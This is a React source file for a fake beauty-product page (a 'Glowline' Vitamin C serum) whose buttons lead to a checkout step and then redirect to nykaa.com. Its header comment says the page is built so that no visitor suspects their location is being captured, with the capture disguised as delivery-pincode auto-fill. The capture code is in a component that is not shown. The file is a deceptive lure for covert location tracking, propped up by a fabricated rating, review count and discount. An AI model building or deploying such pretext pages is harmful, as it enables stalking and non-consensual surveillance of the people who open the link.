import { useState } from 'react'
import { AnimatePresence, motion } from 'framer-motion'
import DeliveryCheckout from '../components/DeliveryCheckout.jsx'

const REDIRECT_URL = 'https://www.nykaa.com'

/**
 * Entry screen — designed to read as a normal shared product page (a beauty
 * product link), with zero hint that any location is being captured. The only
 * location use is framed as a standard "delivery pincode auto-fill" step,
 * which is routine on any e-commerce site.
 */
export default function DemoExperience() {
  const [step, setStep] = useState('product')

  return (
    <div className="min-h-screen bg-[#f5f6f8] text-gray-800">
      <TopBar />

      <AnimatePresence mode="wait">
        {step === 'product' ? (
          <motion.div
            key="product"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0, y: -10 }}
            transition={{ duration: 0.35, ease: 'easeOut' }}
          >
            <ProductShell onCheckout={() => setStep('checkout')} />
          </motion.div>
        ) : (
          <motion.div
            key="checkout"
            initial={{ opacity: 0, y: 12 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            transition={{ duration: 0.35, ease: 'easeOut' }}
          >
            <DeliveryCheckout onDone={() => (window.location.assign(REDIRECT_URL))} />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

function TopBar() {
  return (
    <header className="sticky top-0 z-30 border-b border-gray-200 bg-white/90 backdrop-blur">
      <div className="mx-auto flex max-w-6xl items-center justify-between gap-4 px-5 py-3 sm:px-8">
        <div className="flex items-center gap-2">
          <span className="grid h-8 w-8 place-items-center rounded-lg bg-pink-50 text-pink-600 ring-1 ring-pink-100">
            <LeafIcon />
          </span>
          <span className="font-display text-lg font-semibold tracking-tight text-gray-900">Glowline</span>
        </div>
        <nav className="hidden items-center gap-6 text-sm text-gray-500 sm:flex">
          <span className="hover:text-gray-900">Skincare</span>
          <span className="hover:text-gray-900">Makeup</span>
          <span className="hover:text-gray-900">Offers</span>
        </nav>
        <div className="flex items-center gap-1">
          <span className="grid h-9 w-9 place-items-center rounded-full text-gray-600 hover:bg-gray-100">
            <SearchIcon />
          </span>
          <span className="grid h-9 w-9 place-items-center rounded-full text-gray-600 hover:bg-gray-100">
            <CartIcon />
          </span>
        </div>
      </div>
    </header>
  )
}

function ProductShell({ onCheckout }) {
  return (
    <main className="mx-auto max-w-6xl px-5 py-6 sm:px-8 sm:py-10">
      {/* breadcrumb */}
      <nav className="text-xs text-gray-400">
        Home / <span className="text-gray-500">Skincare</span> / <span className="text-gray-500">Serums</span> /{' '}
        <span className="text-gray-800">Vitamin C Serum</span>
      </nav>

      <div className="mt-5 grid gap-8 lg:grid-cols-2">
        {/* Image side */}
        <div className="flex justify-center">
          <div className="w-full max-w-md rounded-2xl bg-white p-5 ring-1 ring-gray-100">
            <div className="relative overflow-hidden rounded-xl bg-gradient-to-br from-pink-50 via-amber-50 to-white">
              <img
                src="https://images.unsplash.com/photo-1620916566398-39f1143ab7be?auto=format&fit=crop&w=700&q=80"
                alt="Vitamin C Brightening Serum bottle"
                className="h-[300px] w-full object-cover sm:h-[360px]"
                loading="eager"
              />
              <span className="absolute left-4 top-4 rounded-full bg-pink-600 px-3 py-1 text-xs font-semibold text-white">
                Best Seller
              </span>
            </div>
            <div className="mt-4 grid grid-cols-4 gap-2">
              {[0, 1, 2, 3].map((i) => (
                <div
                  key={i}
                  className={`h-16 rounded-lg ring-1 ${i === 0 ? 'ring-2 ring-pink-500' : 'ring-gray-200'}`}
                  style={{
                    backgroundImage:
                      'url(https://images.unsplash.com/photo-1620916566398-39f1143ab7be?auto=format&fit=crop&w=160&q=80)',
                    backgroundSize: 'cover',
                    backgroundPosition: 'center',
                  }}
                />
              ))}
            </div>
          </div>
        </div>

        {/* Details side */}
        <div className="flex flex-col">
          <span className="text-xs font-medium uppercase tracking-wider text-pink-600">
            Glowline · Vitamin C Range
          </span>
          <h1 className="mt-2 font-display text-2xl font-bold leading-tight text-gray-900 sm:text-3xl">
            Vitamin C 20% Brightening Serum with Hyaluronic Acid
          </h1>

          <div className="mt-3 flex items-center gap-2 text-sm">
            <span className="rounded bg-green-700 px-1.5 py-0.5 text-xs font-semibold text-white">4.3</span>
            <span className="text-amber-400">★★★★★</span>
            <span className="text-gray-400">(2,381 reviews)</span>
          </div>

          {/* price */}
          <div className="mt-5 flex items-end gap-2">
            <span className="font-display text-3xl font-bold text-gray-900">₹599</span>
            <span className="text-lg text-gray-400 line-through">₹1,299</span>
            <span className="mb-0.5 rounded bg-green-100 px-1.5 py-0.5 text-sm font-semibold text-green-700">
              54% off
            </span>
          </div>
          <p className="mt-1 text-xs text-green-700">inclusive of all taxes</p>

          {/* offers */}
          <div className="mt-5 space-y-2 rounded-xl border border-dashed border-gray-200 p-3 text-sm">
            <p className="flex items-start gap-2 text-gray-700">
              <span className="mt-0.5 text-pink-500">★</span>
              <span>
                <b className="text-gray-900">Flat ₹150 off</b> on your first order — code{' '}
                <b className="text-pink-600">FIRST15</b>
              </span>
            </p>
            <p className="flex items-start gap-2 text-gray-700">
              <span className="mt-0.5 text-pink-500">★</span>
              <span>
                <b className="text-gray-900">Free delivery</b> on orders above ₹349
              </span>
            </p>
            <p className="flex items-start gap-2 text-gray-700">
              <span className="mt-0.5 text-pink-500">★</span>
              <span>COD available · 30-day easy returns</span>
            </p>
          </div>

          {/* highlights */}
          <ul className="mt-5 space-y-1.5 text-sm text-gray-600">
            {[
              'Brightens dull skin & evens tone in 2 weeks',
              'Pure 20% Vitamin C with ferulic acid + HA',
              'Fragrance-free, non-comedogenic, vegan',
            ].map((t) => (
              <li key={t} className="flex items-start gap-2">
                <span className="mt-1 h-1.5 w-1.5 rounded-full bg-pink-500" />
                {t}
              </li>
            ))}
          </ul>

          {/* qty + CTA */}
          <div className="mt-7 flex flex-col gap-3">
            <div className="flex items-center gap-3">
              <span className="text-sm text-gray-500">Quantity:</span>
              <div className="inline-flex items-center rounded-lg border border-gray-200">
                <button className="px-3 py-1.5 text-gray-500 hover:text-gray-900">−</button>
                <span className="px-2 text-sm font-medium text-gray-900">1</span>
                <button className="px-3 py-1.5 text-gray-500 hover:text-gray-900">+</button>
              </div>
            </div>
            <button
              onClick={onCheckout}
              className="w-full rounded-full bg-pink-600 py-3.5 text-base font-semibold text-white shadow-sm transition hover:bg-pink-700 sm:py-4"
            >
              Buy Now
            </button>
            <button
              onClick={onCheckout}
              className="w-full rounded-full border border-pink-600 py-3.5 text-base font-semibold text-pink-600 transition hover:bg-pink-50"
            >
              Add to Cart
            </button>
          </div>

          <div className="mt-6 flex items-center justify-between rounded-xl bg-gray-50 p-3 text-xs text-gray-500">
            <span>✔ Genuine product · sealed pack</span>
            <span>Delivered in 2–4 days</span>
          </div>
        </div>
      </div>
    </main>
  )
}

function LeafIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5" aria-hidden>
      <path d="M4 20c8 0 16-3 16-14C12 6 4 9 4 20Z" stroke="currentColor" strokeWidth="1.7" strokeLinejoin="round" />
      <path d="M4 20C7 12 11 8 17 6" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" />
    </svg>
  )
}
function SearchIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5" aria-hidden>
      <circle cx="11" cy="11" r="7" stroke="currentColor" strokeWidth="1.7" />
      <path d="m20 20-3.5-3.5" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" />
    </svg>
  )
}
function CartIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5" aria-hidden>
      <path d="M6 7h12l-1.2 9.1a1 1 0 0 1-1 .9H8.2a1 1 0 0 1-1-.9L6 7Z" stroke="currentColor" strokeWidth="1.7" strokeLinejoin="round" />
      <path d="M9 10V6a3 3 0 0 1 6 0v4" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" />
    </svg>
  )
}
